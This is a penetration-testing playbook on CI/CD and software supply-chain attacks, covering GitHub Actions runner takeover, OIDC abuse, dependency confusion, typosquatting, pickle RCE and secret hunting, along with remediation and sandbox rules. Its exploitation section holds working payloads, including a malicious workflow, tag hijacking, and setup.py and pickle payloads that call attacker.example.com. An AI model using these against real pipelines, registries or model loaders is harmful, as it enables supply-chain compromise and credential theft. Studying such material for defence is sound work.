# CI/CD Pipeline & Software Supply Chain — Skill Playbook

**Mitre ATT&CK ID:** T1195 (Supply Chain Compromise)
**OWASP Mapping:** A08:2021 – Software and Data Integrity Failures
**Severity:** Critical / High
**Last Updated:** 2026-08-04

---

## Metadata

```yaml
skill_id: ci-cd-supply-chain-v1
category: supply-chain
author: HiveBreach
mitre_attack_id: T1195
owasp_mapping:
  - A08:2021-SoftwareandDataIntegrityFailures
tags:
  - ci-cd
  - supply-chain
  - github-actions
  - gitlab-ci
  - azure-pipelines
  - jenkins
  - oidc
  - dependency-confusion
  - artifact-registry
  - typosquatting
  - ml-supply-chain
  - secret-leakage
  - T1195
  - T1195.001
  - T1195.002
  - T1554
  - T1546
  - T1204
  - T1588
environments:
  - ci-cd
  - github-actions
  - gitlab-ci
  - azure-pipelines
  - jenkins
  - artifact-registry
  - cloud
  - ml-models
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Attack Surface Enumeration

Map the software supply chain and CI/CD estate before testing:

| Asset | What to Enumerate |
|---|---|
| CI/CD platform | GitHub Actions / GitLab CI / Azure Pipelines / Jenkins / CircleCI |
| Runner inventory | Self-hosted runners, ephemeral runners, runner labels, runner scope |
| Pipeline definitions | `.github/workflows/*.yml`, `.gitlab-ci.yml`, `azure-pipelines.yml`, `Jenkinsfile`, `Jenkinsfile.groovy` |
| Repository settings | Branch protection rules, tag protection, merge queues, environments |
| Workflow secrets | `secrets.*` references, environment-scoped secrets, OIDC permissions |
| OIDC / federation | `.write` permissions, `id-token: write`, workload identity federations, assume-role policies |
| Dependencies | Package manifests, lockfiles, transitive dep tree, resolved registries |
| Artifacts | Published packages, container images, SBOM availability, signature presence |
| Build output | Release binaries, npm/pip/Maven/PyPI artifacts, Docker Hub / GHCR / ECR images |
| Signing & SLSA | cosign signatures, keyless signatures, provenance attestations, sbom attestations |

### 1.2 Repo & Config Discovery

```bash
# Enumerate workflows and pipeline files
find . -path ./.git -prune -o -name '*.yml' -print | grep -Ei 'workflow|pipeline|action'
find . -name '*.github' -o -name '.gitlab-ci.yml' -o -name 'azure-pipelines.yml' -o -name 'Jenkinsfile*'

# Grep for dangerous workflow constructs
rg -n 'pull_request_target|workflow_run|workflow_dispatch|self-hosted|runs-on|GITHUB_TOKEN' .github/
rg -n 'permissions:|id-token:|write-all|contents: write|pull-requests: write' .github/workflows/

# Grep for hardcoded secrets / tokens in config
rg -n '(AKIA[0-9A-Z]{16}|ghp_|gho_|github_pat_|sk-[A-Za-z0-9]{20,}|AIza[0-9A-Za-z_-]{35}|-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----)' .

# Inspect dependency sources
rg -n 'npm|pip|maven|nuget|golang' package.json *.lock requirements*.txt pom.xml *.csproj go.mod
```

### 1.3 Secret Leakage Discovery

The git history is a high-yield secret source:

```bash
# Dump every blob ever committed, including deleted branches and tags
git log --all --full-history -p -- . > /tmp/full_history.txt

# Targeted secret regex scan across all history
git log --all -p -- . | rg -n '(AKIA|ghp_|gho_|slack_|sk-|password\s*=\s*["'"'"'][^"'"'"']+|api[_-]?key\s*=)' -i

# git filter-branch style history export for forensic review
git rev-list --all --objects | sort -k2 | uniq -f1 -d

# Search reflog and stashes (often missed secrets)
git reflog
git stash list
```

### 1.4 Artifact & Dependency Confusion Detection

```bash
# Detect package names that do not exist in the canonical registry
python3 - <<'EOF'
import json, urllib.request
names = ["internal-auth-sdk", "mycompany-utils", "core-logger"]
for n in names:
    try:
        urllib.request.urlopen(f"https://registry.npmjs.org/{n}", timeout=5)
        print(f"[PUBLIC-EXISTS] {n}")
    except urllib.error.HTTPError as e:
        print(f"[NOT-IN-NPM] {n} (HTTP {e.code})")
    except Exception as e:
        print(f"[ERROR] {n}: {e}")
EOF

# Check resolved registry for private packages
npm config get registry
pip config list
grep -rn 'extra-index-url' requirements*.txt pyproject.toml

# Flag dependencies pinned to private/unknown hosts
rg -n '(git\+ssh|git\+https|github.com/|nexus|artifactory|harbor)' package.json *.lock pom.xml go.mod
```

### 1.5 ML/AI Supply Chain Detection

| Attack Vector | Detection Signal |
|---|---|
| Poisoned model weights | Hash mismatch vs upstream, model card provenance missing |
| Model registry abuse | Unvetted registries (Hugging Face mirror, private mirrors), no signed artifacts |
| Prompt/model exfiltration | Model serving endpoints accepting unexpected eval data |
| Data poisoning (training) | Training data pulled from untrusted mirrors / unverified datasets |
| Pickle/serialisation RCE | `torch.load`/`pickle.load` on untrusted `.pth`/`.pickle` files |
| OSS model typosquatting | Model IDs similar to popular names (e.g. `mistral7b-gguf` vs `mistral-7b`), eval/test-time triggers |

### 1.6 Chain-of-Trust & Signature Gap Detection

```bash
# Are dependencies pinned to immutable hashes?
rg -n '"[a-zA-Z0-9_.-]+"\s*:\s*"\^?[0-9]"' package.json | head
rg -n 'sha256=|=sha256:' package-lock.json requirements*.lock

# Inspect SBOM / provenance presence for released artifacts
syft packages <image-or-dir> -o spdx-json | jq -r '.packages[].name' | head
cosign verify --key <pubkey> <image> 2>&1 | rg -i 'signature|error|not found'

# Confirm registry resolution order (private vs public) for dependency confusion
npm config get registry   # single source
# pip: pyproject.toml install_requires + extra-index-url order matters
```

---

## 2. Confirmation

Every detection signal must be independently confirmed.

### 2.1 Confirm Runner Takeover Feasibility

| Condition | Confirms |
|---|---|
| Workflow triggers on `pull_request_target` and executes untrusted checkout code | PR-based RCE |
| Self-hosted runner on a `runs-on:` label reachable from any branch | Runner compromise |
| `GITHUB_TOKEN` has `contents: write` / `write-all` scope | Repo write-back |
| Workflow uses `actions/checkout` on PR ref with `pull_request_target` | Checkout poisoning |
| Runner on Windows shares the machine (Docker outside container) | Host compromise |

Confirm with a benign echo step in a throwaway branch or fork before any payload.

### 2.2 Confirm OIDC / Workload Identity Federation

```bash
# Check token request scope in workflow
rg -n 'id-token: write' .github/workflows/
rg -n 'permissions:' .github/workflows/

# Confirm cloud side role assumption is permitted from the workflow
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::ACCOUNT:role/ci-role \
  --role-session-name test --web-identity-token "$TOKEN" --query Credentials --output json
```

A valid assumption proves the OIDC trust chain is attacker-invocable if the workflow can be triggered.

### 2.3 Confirm Secret Leakage

```bash
# Verify the secret still exists (do NOT print full value)
grep -c 'ghp_xxxxx' /tmp/full_history.txt
echo -n "ghp_xxxxx" | xargs -I{} curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer {}" \
  "https://api.github.com/user"   # 401 = revoked/invalid, 200 = still valid (only in sandbox)
```

### 2.4 Confirm Dependency Confusion

```bash
# Install the private-named package in a sandbox venv WITHOUT the private index
pip download --no-deps <private-pkg-name> -d /tmp/sandbox_dl
# If it resolves from PyPI instead of the internal index → confusion confirmed
npm view <private-pkg-name>   # public registry response = confirmation of typo/confusion risk
```

### 2.5 Confirm Signature / Provenance Gaps

- Artifact ships without cosign signature or SLSA provenance → chain-of-trust gap confirmed.
- Package lockfile absent / unpinned transitive deps → drift and substitution confirmed.
- SBOM absent or stale → integrity tracking confirmed broken.

---

## 3. Exploitation

### 3.1 Self-Hosted Runner Takeover (GitHub Actions)

Scenario: repository uses `pull_request_target` + self-hosted runner, or a fork can inject workflow logic.

```yaml
# malicious-poc.yml — placed at .github/workflows/ in the target repo context
name: Runner Takeover PoC
on:
  pull_request_target:
    types: [opened]
  workflow_dispatch:

permissions:
  contents: write        # exploit GITHUB_TOKEN scope
  id-token: write        # OIDC federation abuse

jobs:
  pwn:
    runs-on: [self-hosted, linux]
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # checkout attacker branch
      - name: Eval untrusted code
        run: |
          echo "[POC] Self-hosted runner execution"
          cat /etc/hostname
          id
          ls -la $RUNNER_WORKSPACE
          echo "runner_path=${{ runner.workspace }}"
          echo "runner_os=${{ runner.os }}"
```

Impact on compromise:
- Runner environment `GITHUB_TOKEN` secrets accessible via `env` / step output.
- SSH into self-hosted box if network path exists → full lateral movement.
- Steal `.env` files, keystores, and mounted credentials on the runner.

### 3.2 Branch Protection Bypass

Weakness chain: branch protection exists, but tags or environments are unguarded, or `GITHUB_TOKEN` can write.

```bash
# Push directly to a protected branch via a PAT with repo write if policy allows
git push origin attacker-branch
# If branch protection only blocks pushes from regular users, escalate via admin PAT leak

# Tag hijack: replace the tag a release build watches
git tag -f v1.0.0 <malicious-commit>
git push origin --force --tags
```

Environment-based protection bypass:
```yaml
# workflow referencing a protected environment with lax rules
deploy:
  runs-on: ubuntu-latest
  environment: production      # if approval is disabled / self-review allowed
  steps:
    - run: ./deploy.sh
```

### 3.3 OIDC / Workload Identity Federation Abuse

```yaml
# workflow that can be triggered by any PR but trusts OIDC
jobs:
  cloud:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/oidc-deployer@v1
        with:
          audience: 'https://github.com/'${{ github.repository_owner }}
      - run: |
          # now the step assumes the cloud role bound to this OIDC subject
          aws sts get-caller-identity
```

Attack path: attacker opens a PR on a repo whose workflow triggers cloud deployment → assumes CI role → accesses cloud resources (S3, secrets manager, KMS).

### 3.4 Artifact Registry Poisoning

#### Dependency Confusion

```bash
# Attacker publishes a public package with the SAME name as a private one
# Example: private 'mycorp-login-sdk' is installed from a private index with a fallback
# to the public registry (pip extra-index-url / npm .npmrc scope fallback).
```

```bash
# local reproduction of the install-order flaw
python3 -m venv /tmp/venv
/tmp/venv/bin/pip install --index-url https://private.index/ --extra-index-url https://pypi.org/simple mycorp-login-sdk
# higher public version number wins → attacker payload executes on build
```

```python
# malicious 'mycorp-login-sdk' package setup.py (PoC only)
import subprocess, urllib.request
subprocess.Popen(["curl", "http://attacker.example.com/exfil?h=" + open("/etc/hostname").read().strip()])
```

#### Typosquatting

Register near-identical names in public registries (`npm`, `pip`, `Maven Central`, `Docker Hub`):
- `lodash` vs `loadash`, `request` vs `requestt`, `urllib3` vs `urllib3-`, `base64` variants.
- Docker Hub: `library/nginx` vs `nginxx`, `alpine` vs `alpine-` typos.

### 3.5 ML/AI Supply Chain Attacks

```python
# Pickle RCE on untrusted model load (torch/pickle) — sandbox only
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned && curl http://attacker.example.com/poc",))

evil = pickle.dumps(RCE())
open("/tmp/evil.pth", "wb").write(evil)

# Victim side: torch.load("/tmp/evil.pth") or pickle.load(open("/tmp/evil.pkl","rb"))
```

Model poisoning (backdoor):
- Embed trigger (e.g., `--DEBUG_MODE`) in training data; model misbehaves only under trigger.
- Evade detection by keeping normal-task accuracy identical on clean inputs.

### 3.6 Secret Leakage from History / Logs / Env

```bash
# Extract secrets from CI logs (build logs, artifact downloads, cache)
# Common leak points: echo $TOKEN, curl -H "Authorization: Bearer $TOKEN", build caches
# Grep CI logs for patterns
rg -n 'AKIA|ghp_|sk-[A-Za-z0-9]|password' /var/log/ci/ build.log 2>/dev/null

# Environment leakage via unencrypted context
env | rg -i 'token|secret|key|pass'
```

### 3.7 Chain-of-Trust & Signature Validation Gaps

- Unverified images/artifacts: `docker pull` of unsigned images; no `cosign verify`.
- No SLSA provenance → build provenance cannot be proven.
- Self-signing / hard-coded public keys in repos → attacker can supply own key.
- `pip install` / `npm install` with `--no-check-certificate` or pinned internal CA bypasses.

---

## 4. Tool-Specific Guidance

### 4.1 Secret Scanning

```bash
# TruffleHog — scan current repo, branches, and history
trufflehog github --repo https://github.com/org/repo --results=verified
trufflehog git file:///path/to/repo --only-verified
trufflehog filesystem /path/to/dir --regex --entropy=True

# Gitleaks — pre-commit / CI and full history scan
gitleaks detect --source . --log-opts="--all"
gitleaks detect --source . --verbose --report-path gitleaks-report.json
gitleaks detect --source . --redact

# Git-based secret archaeology
git log --all --full-history -p -- . | rg -n '(ghp_|AKIA|sk-|BEGIN (RSA|OPENSSH) PRIVATE KEY)'
```

### 4.2 Dependency & Vulnerability Scanning

```bash
# OWASP Dependency-Check (Java/.NET/other ecosystems)
dependency-check --scan . --format HTML --out /tmp/dc-report
dependency-check --scan . --nvdApiKey "$NVD_KEY" --format JSON --out /tmp/dc-report.json

# OSV-Scanner (vulnerable versions via OSV database)
osv-scanner scan --recursive ./
osv-scanner scan --lockfile package-lock.json
osv-scanner scan -r --config osv-scanner.toml ./

# Syft — SBOM generation
syft dir:. -o cyclonedx-json > sbom.cdx.json
syft packages alpine:latest -o spdx-json > alpine-sbom.json

# Grype — SBOM vulnerability matching
grype sbom.cdx.json -o table
grype <image> --fail-on high
grype dir:. --exclude ./node_modules

# pip-audit / npm audit for quick triage
pip-audit -r requirements.txt
npm audit --omit=dev
```

### 4.3 CI/CD Platform Checks

```bash
# GitHub
gh workflow list --repo org/repo
gh api repos/org/repo/actions/permissions
gh api repos/org/repo/branches/main/protection
gh api repos/org/repo/actions/secrets --jq '.secrets[].name'
gh api repos/org/repo/actions/runners --jq '.runners[] | {id,name,status,labels}'
gh api repos/org/repo/actions/runs --jq '.workflow_runs[].name'

# GitLab
glab ci list
# Jenkins
curl -s -k https://jenkins.example.com/script/ | rg -i 'script console|manage'
# Generic CI misconfig probes
curl -s https://ci.example.com/env | rg -i 'token|secret'
```

### 4.4 Supply-Chain Static Analysis

```bash
# Semgrep — custom & built-in supply-chain rules
semgrep scan --config=auto --config='p/supply-chain' ./
semgrep scan --config 'r/python.lang.security.audit.pickle-load.pickle-load' .

# repo visibility for GitHub Actions misconfig
rg -n 'pull_request_target|workflow_run|runs-on:\s*self-hosted|write-all|id-token:\s*write' .github/
```

### 4.5 OIDC / Cloud Trust Testing

```bash
# Extract JWT from a local OIDC emulation and inspect claims
echo "$CI_JWT" | jq -R 'split(".")[1] | @base64d | fromjson'
# Check the subject claim structure that cloud role trust policies match
# Verify role trust policy allows the workflow subject
aws iam get-role --role-name ci-role --query 'Role.AssumeRolePolicyDocument'
```

---

## 5. PoC Generation

Every finding must produce a reproducible Proof of Concept.

### PoC Template

```markdown
## CI/CD Supply Chain — [FINDING_ID]

**Platform:** GitHub Actions / GitLab CI / Azure Pipelines / Jenkins / NPM / PyPI / Docker Hub
**Component:** <workflow / runner / secret / dependency / artifact / model>
**Type:** Runner Takeover / OIDC Abuse / Dependency Confusion / Typosquatting / Secret Leak / Chain-of-Trust Gap
**Confidence:** Confirmed / Unconfirmed

### Trigger
```
<workflow path or package name or registry entry>
```

### Payload / Evidence
- [Screenshot of runner execution output]
- [OIDC assume-role response]
- [Package resolution output from public registry]
- [Secret token snippet (redacted to prefix + 4 chars)]
- [Signature/provenance absence proof]

### Impact
- Code execution: CI/CD runner (YES/NO)
- Cloud resource access: YES/NO (scope: ___)
- Secrets exposed: YES/NO (count: ___)
- Artifact tampered: YES/NO
- Chain-of-trust broken: YES/NO

### Remediation
- Restrict `pull_request_target` to trusted refs; never checkout untrusted branches
- Use ephemeral, containerised runners only
- Scope `GITHUB_TOKEN` to least privilege (no `write-all`)
- Pin OIDC subjects / conditions in cloud role trust policies
- Pin all dependencies to hashes; disable fallback public indexes
- Add cosign keyless signing + SLSA provenance + SBOM attestation
- Rotate leaked secrets immediately
- Sign and verify all ML models; avoid `pickle.load` on untrusted artifacts

### Reproduction Steps
1. Create a fork/branch with a malicious workflow or package name.
2. Trigger the pipeline (PR open / workflow_dispatch / tag push).
3. Observe runner output, assumed role, or installed dependency.
4. Collect evidence and revert all changes.
```

---

## 6. Verification (Sandbox)

All CI/CD supply-chain exploitation **must** be verified in a sandbox environment before reporting.

### Sandbox Checklist
- [ ] Malicious workflow executed only on an ephemeral CI runner (no secrets, no cloud creds)
- [ ] Dependency-confusion package installed in an isolated venv/container with dummy credentials
- [ ] Secret leakage verified against a deliberately placed decoy token, not real secrets
- [ ] OIDC assumption tested against a throwaway role with a minimal policy
- [ ] Poisoned model loaded only in an offline container
- [ ] All changes reverted; no artifacts published outside sandbox
- [ ] No destructive commands (no tag force-push on production repos)

### Prohibited Actions
- Running malicious workflows against production repositories/registries
- Uploading typosquatting packages to public registries
- Installing real dependencies from attacker-controlled sources in production
- Exfiltrating any real credentials, even "proving" they work
- Altering signed artifacts or release tags of production repos

---

## 7. CI/CD Platform-Specific Notes

| Platform | Runner Concept | OIDC Support | Secret Model | Key Attack Surfaces |
|---|---|---|---|---|
| GitHub Actions | hosted / self-hosted | Yes (`id-token: write`) | repo/env/org secrets | `pull_request_target`, tag hijack, `write-all` |
| GitLab CI | shared / specific runners | Yes (`CI_JOB_JWT`) | CI/CD variables (masked) | `include` from untrusted refs, `rules:` on MR events |
| Azure Pipelines | Microsoft / self-hosted agents | Yes (workload identity federation) | library variable groups | agent pool access, `dependencies` on PR, ADO PATs |
| Jenkins | master / agent (JNLP) | Partial (plugin-based) | credentials store | Script Console, Groovy hooks, unsecured agent jobs, `SCM Polling` |
| CircleCI | docker / machine / self-hosted | Yes (OIDC tokens) | contexts & project env | fork PRs, untrusted orbs, `context` misuse |

### Platform-Specific Attack Points

- **GitHub Actions:** `pull_request_target` + `actions/checkout` on PR head SHA = runner RCE; tag force-push replay; `workflow_run` triggered by untrusted workflow; `actions/github-script` executing untrusted inputs.
- **GitLab CI:** `include:` fetching remote/untrusted CI templates; `CI_JOB_JWT` default claims; `rules:` matching attacker branch names; `docker:dind` on shared runners.
- **Azure Pipelines:** self-hosted agent on shared infra; variable group with non-masked secrets; `pull_request` triggers building fork code with PR-scoped tokens.
- **Jenkins:** Script Console (`/script`) unauth admin; `Groovy Postbuild` plugins; `SCM` plugin fetches malicious `Jenkinsfile` from untrusted branches; exposed `credentials` binding.

### Runner Hardening (Remediation Baseline)

- Ephemeral, containerised, single-job runners only (no persistent self-hosted boxes)
- No secrets on runners outside environment-scoped vaults
- OIDC conditions on trust policies: require `repository`, `ref`, `environment` claims
- Mandatory branch protection on `main`, tag protection, and `required_status_checks`

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1195 | Supply Chain Compromise | Primary |
| T1195.002 | Compromise Software Supply Chain | Direct mapping (artifacts/releases) |
| T1195.001 | Compromise Software Dependencies and Development Tools | Dependency/registry poisoning |
| T1554 | Compromise Client Software Binary | Tampered binaries post-publish |
| T1546 | Event Triggered Execution | Malicious workflow hooks / pipeline events |
| T1204 | User Execution | Poisoned package / model executed by devs |
| T1588 | Obtain Capabilities | Typosquatting, registered malicious packages |
| T1610 | Deploy Container | RCE via poisoned image |
| T1199 | Trusted Relationship | Runner / federated identity trust chains |
| T1552.001 | Credentials in Files | Secrets in git history / env / logs |
| T1059 | Command and Scripting Interpreter | Malicious workflow steps |

---

## 9. References

- MITRE ATT&CK T1195: https://attack.mitre.org/techniques/T1195/
- OWASP A08:2021 Software and Data Integrity Failures: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- OWASP Software Supply Chain Security: https://owasp.org/www-community/Threat_Modeling_Process
- SLSA Framework: https://slsa.dev/
- GitHub Actions security hardening: https://docs.github.com/en/actions/security-for-github-actions
- GitHub Advisory "pwn requests": https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- GitLab CI/CD security: https://docs.gitlab.com/ee/ci/
- Azure Pipelines security: https://learn.microsoft.com/en-us/azure/devops/pipelines/security/
- TruffleHog: https://github.com/trufflesecurity/trufflehog
- Gitleaks: https://github.com/gitleaks/gitleaks
- OWASP Dependency-Check: https://owasp.org/www-project-dependency-check/
- OSV-Scanner: https://github.com/google/osv-scanner
- Syft: https://github.com/anchore/syft
- Grype: https://github.com/anchore/grype
- Cosign: https://github.com/sigstore/cosign
- SLSA / in-toto provenance: https://in-toto.io/
- Hugging Face security best practices: https://huggingface.co/docs/hub/security

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
